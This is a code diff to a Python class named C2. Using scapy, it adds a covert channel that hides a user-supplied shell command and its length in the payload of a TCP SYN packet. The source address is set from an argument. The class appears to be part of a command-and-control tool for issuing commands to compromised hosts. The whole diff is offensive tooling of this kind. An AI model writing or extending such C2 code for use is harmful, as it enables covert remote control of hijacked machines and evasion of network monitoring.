@@ -31,13 +31,27 @@ class C2:
         Args:
             args (argparse.Namespace): argparse arguments containing the TCP packet options.
         """
-        packet = IP(dst=args.dip, src=args.sip) / TCP(
-            dport=args.dport, sport=args.sport, flags="S", seq=args.seq
+
+        try:
+            command = args.command.encode(encoding="utf-8")
+        except UnicodeEncodeError:
+            self.view.print_error("Could not encode shell command.")
+
+        cmd_len = struct.pack("!I", len(command))
+
+        packet = (
+            IP(dst=args.dip, src=args.sip)
+            / TCP(dport=args.dport, sport=args.sport, flags="S", seq=args.seq)
+            / command
+            / cmd_len
         )
 
+        if len(packet) > 5000:
+            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
+            return False
         self.view.print_msg(f"Sending: {packet.summary()}")
         try:
-            send(packet)
+            send(packet, verbose=False)
             self.view.print_success("Packet sent successfully.")
         except PermissionError:
             self.view.print_error(f"Failed to send packet. Are you root?")
